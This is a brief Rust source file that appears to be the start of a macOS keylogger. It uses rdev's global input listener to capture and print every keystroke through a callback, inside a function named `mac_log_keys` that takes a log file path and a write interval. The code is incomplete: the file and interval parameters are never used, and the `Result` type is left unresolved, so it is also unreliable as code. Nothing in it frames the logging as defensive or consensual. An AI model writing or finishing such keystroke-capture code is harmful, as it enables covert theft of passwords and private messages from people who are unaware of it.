use rdev::{listen, Event};


fn callback(event: Event) {
    println!("My callback {:?}", event);
    match event.name {
        Some(string) => println!("User wrote {:?}", string),
        None => (),
    }
}

pub(crate) fn mac_log_keys(log_file: String, write_interval: u64) -> Result<()> {
    listen(callback)
}
